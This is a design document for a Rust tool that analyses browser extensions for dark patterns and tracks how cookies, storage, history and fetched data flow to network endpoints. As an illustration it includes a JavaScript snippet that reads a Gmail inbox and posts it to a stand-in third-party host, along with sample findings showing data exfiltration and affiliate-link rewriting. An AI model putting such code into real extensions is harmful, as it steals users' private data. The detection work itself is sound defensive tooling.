# Dark Pattern Detection & Data Flow Analysis Design

**Date**: 2026-01-20
**Status**: Proposed

## Overview

Enhance Extension Analyzer to detect dark patterns and provide deeper insight into what data flows to network endpoints.

### Goals

1. **Source tracking for data flow** - Trace values in network calls back to their origins (cookies, localStorage, DOM, browsing history, user input, other network responses)
2. **Cross-request data flow** - Detect when data fetched from one domain is sent to another (exfiltration pattern)
3. **Endpoint grouping by URL** - Restructure output to show each unique URL once, with HTTP methods and data sources listed underneath
4. **Dark pattern detection** - Static pattern rules for four categories, enhanced with LLM contextual analysis
5. **Severity filtering** - CLI flag to control which severity levels are displayed

## Data Flow Tracking

### DataSource Enum

```rust
pub enum DataSource {
    Cookie(Option<String>),           // document.cookie or specific cookie name
    LocalStorage(String),             // localStorage.getItem(key)
    SessionStorage(String),           // sessionStorage.getItem(key)
    BrowsingHistory,                  // chrome.history.search results
    DomElement(String),               // document.querySelector(...).innerText
    UserInput(String),                // input field value by ID/name
    Location(String),                 // location.href, location.pathname, etc.
    NetworkResponse(String),          // data fetched from another URL
    Unknown(String),                  // untracked variable name
}
```

### SourceTracker

New struct that maintains variable-to-source mappings as the AST is walked:

```rust
struct SourceTracker {
    bindings: HashMap<String, Vec<DataSource>>,
}
```

### Detection Points

| Code Pattern | DataSource |
|--------------|------------|
| `document.cookie` | `Cookie(None)` |
| `localStorage.getItem('x')` | `LocalStorage("x")` |
| `sessionStorage.getItem('x')` | `SessionStorage("x")` |
| `chrome.history.search(...)` | `BrowsingHistory` |
| `document.getElementById('x').value` | `UserInput("x")` |
| `location.href`, `window.location` | `Location("href")` |
| `await fetch(url)`, `xhr.response` | `NetworkResponse(url)` |
| `document.querySelector(...).innerText` | `DomElement(selector)` |

### Flow Propagation

When analyzer sees `let x = localStorage.getItem('key')`:
- Records `bindings["x"] = [LocalStorage("key")]`

When it sees `fetch(url, {body: x})`:
- Looks up `x` in bindings
- Associates `LocalStorage("key")` with that endpoint

For chained assignments (`let y = x`):
- Sources propagate: `bindings["y"] = bindings["x"].clone()`

## Cross-Request Data Flow

### Problem

Detect when data fetched from one domain gets sent to another - a key exfiltration pattern.

### Example

```javascript
// Fetch user's email content
let response = await fetch('https://mail.google.com/api/inbox');
let data = await response.json();

// Exfiltrate to third party
fetch('https://sketchy-analytics.com/collect', {
    body: JSON.stringify({ emails: data })
});
```

### Detection

1. Track fetch/XHR response assignments: `bindings["data"] = [NetworkResponse("mail.google.com")]`
2. When outbound request uses that data, check if domains differ
3. If different domains → flag as potential data exfiltration

### Edge Cases

- Same domain transfers: allowed (normal API usage)
- Subdomain transfers: configurable (may or may not be suspicious)
- Known CDN/API domains: allowlist to reduce false positives (googleapis.com, cdn.jsdelivr.net)

## Endpoint Grouping Output

### Current Behavior

Groups by `(method, url)` - same URL with different methods shows as separate entries.

### New Behavior

Group by URL, list methods and data sources underneath.

### Output Format

```
── Network Endpoints ────────────────────────────────────────

  https://api.example.com/user
    → GET                                    (background.js:45)
    → POST                                   (content.js:120)
        Sends: localStorage("userId"), Cookie("session")
    Context: API

  https://analytics.sketchy.xyz/collect
    → POST                                   (tracker.js:88)
        Sends: BrowsingHistory, NetworkResponse(mail.google.com)
    Context: SUSPICIOUS
    ⚠ Cross-domain data transfer detected

  https://cdn.affiliate.net/redirect
    → GET                                    (links.js:33)
        Sends: Location("href")
    Context: ANALYTICS
```

### Updated Endpoint Struct

```rust
pub struct Endpoint {
    pub url: String,
    pub method: Option<HttpMethod>,
    pub data_sources: Vec<DataSource>,  // replaces payload_fields
    pub location: Location,
    pub context: EndpointContext,
    pub flags: Vec<EndpointFlag>,       // CrossDomainTransfer, SensitiveData, etc.
}

pub enum EndpointFlag {
    CrossDomainTransfer { source_domain: String },
    SensitiveData,
    KnownTracker,
}
```

## Dark Pattern Detection

### New File: `src/analyze/dark_patterns.rs`

### Categories and Static Rules

#### 1. Monetization Manipulation

| Pattern | Detection Method |
|---------|------------------|
| Affiliate link injection | Rewrites URLs to add `?ref=`, `?affiliate=`, or known affiliate domains |
| Ad injection | Inserts elements with ad-related classes/IDs, loads scripts from ad networks |
| Search hijacking | Modifies search inputs, intercepts form submissions to search engines |
| Price comparison injection | Modifies e-commerce pages, injects price overlays |

#### 2. Privacy Deception

| Pattern | Detection Method |
|---------|------------------|
| Hidden tracking | Sends data to analytics endpoints not mentioned in manifest |
| Excessive data collection | Collects cookies, history, or DOM content beyond stated permissions |
| Fingerprinting | Uses canvas, WebGL, audio context for device fingerprinting |
| Silent data sync | Periodic background data transmission without user action |

#### 3. User Manipulation

| Pattern | Detection Method |
|---------|------------------|
| Review nagging | `chrome.runtime.setUninstallURL` with review links, repeated notifications |
| Fake urgency | Injects countdown timers, "limited time" overlays |
| Notification spam | High-frequency `chrome.notifications.create` calls |
| Disguised ads | Click handlers on non-ad elements that open ad URLs |

#### 4. Bait-and-Switch

| Pattern | Detection Method |
|---------|------------------|
| Permission creep | Requests permissions beyond manifest description |
| Hidden functionality | Code paths that activate after delay or specific triggers |
| Deceptive naming | (LLM-assisted) Compare extension name/description to actual behavior |

### Category and Type Enums

```rust
pub enum Category {
    Permission,
    CodePattern,
    Network,
    DarkPattern(DarkPatternType),
}

pub enum DarkPatternType {
    // Monetization
    AffiliateInjection,
    AdInjection,
    SearchHijacking,

    // Privacy
    HiddenTracking,
    ExcessiveCollection,
    Fingerprinting,
    DataExfiltration,

    // Manipulation
    ReviewNagging,
    NotificationSpam,
    FakeUrgency,
    DisguisedAds,

    // Bait-and-switch
    PermissionCreep,
    HiddenFunctionality,
    MisleadingDescription,
}
```

## LLM Integration

### New Analysis Task

`AnalysisTask::DarkPatternReview` - runs after static analysis.

### Prompt Structure

```
You are analyzing a browser extension for dark patterns - deceptive practices
that manipulate users against their interests.

Extension: {name} (described as: "{store_description}")
Stated purpose: {manifest.description}

== Static Analysis Flags ==
{list of flagged patterns with code snippets}

== Data Flow Summary ==
{endpoints with their data sources, cross-domain transfers}

== Questions to Answer ==

1. MONETIZATION: Does this extension inject affiliate links, ads, or modify
   prices/search results without clear disclosure?

2. PRIVACY: Does the data collection align with the stated purpose? Is any
   data sent to unexpected third parties?

3. MANIPULATION: Are there patterns designed to nag, pressure, or trick users
   (fake urgency, hidden subscription prompts, review begging)?

4. BAIT-AND-SWITCH: Does the actual behavior match what's promised in the
   name and description?

For each dark pattern found, respond with:
- TYPE: [category]
- SEVERITY: [low/medium/high/critical]
- EVIDENCE: [specific code or behavior]
- EXPLANATION: [why this harms users]
```

### LLM Value-Add

The LLM provides analysis where static rules can't:
- Judging if data collection is "reasonable" for the extension's purpose
- Comparing actual behavior vs store description
- Identifying novel dark patterns not in the ruleset
- Understanding obfuscated or indirect manipulation

## CLI: Severity Threshold Flag

### Usage

```bash
# Show only critical and high severity findings
cargo run -- --min-severity high <extension-id>

# Show everything including informational findings
cargo run -- --min-severity info <extension-id>

# Show medium and above (default)
cargo run -- --min-severity medium <extension-id>
```

### Severity Levels

From low to high:
- `info` - Informational notes, not necessarily problems
- `low` - Minor concerns, unlikely to harm users
- `medium` - Notable issues worth investigating
- `high` - Significant concerns, likely harmful
- `critical` - Severe issues, definitely harmful

### Default

`medium` - shows medium, high, and critical findings.

### Implementation

Filter applied in `terminal.rs` before printing each section. Endpoints inherit the severity of their most severe flag.

## Output Format

### New Dark Patterns Section

```
── Dark Patterns ────────────────────────────────────────────

  ✖ CRITICAL  Data Exfiltration                  tracker.js:88
              Data from mail.google.com sent to analytics.xyz
              without user consent or disclosure.

              │ fetch('https://analytics.xyz/c', {body: emailData})

  ⚠ HIGH      Affiliate Link Injection           content.js:204
              Rewrites Amazon links to add affiliate ID on
              all shopping sites.

              │ link.href = link.href + '?tag=ext-20'

  ⚠ MEDIUM    Review Nagging                     background.js:12
              Prompts for Chrome Web Store review after every
              3rd use via notification.
```

### Enhanced LLM Summary

The summary section includes a "Dark Pattern Risk" subsection rating overall trustworthiness and summarizing concerns.

## File Changes Summary

| File | Changes |
|------|---------|
| `src/models/endpoint.rs` | Add `DataSource`, `EndpointFlag`, update `Endpoint` struct |
| `src/models/finding.rs` | Add `DarkPatternType` enum, extend `Category` |
| `src/analyze/mod.rs` | Integrate dark pattern analysis |
| `src/analyze/dark_patterns.rs` | NEW: static dark pattern rules |
| `src/analyze/javascript.rs` | Add `SourceTracker`, cross-request tracking |
| `src/llm/agents.rs` | Add `DarkPatternReview` task and prompt |
| `src/output/terminal.rs` | New grouping logic, dark patterns section, severity filter |
| `src/main.rs` | Add `--min-severity` CLI flag |

## Testing Strategy

- Unit tests for `SourceTracker` with various assignment patterns
- Unit tests for each dark pattern rule
- Integration tests with sample extensions containing known dark patterns
- Test cross-domain detection with mock fetch chains
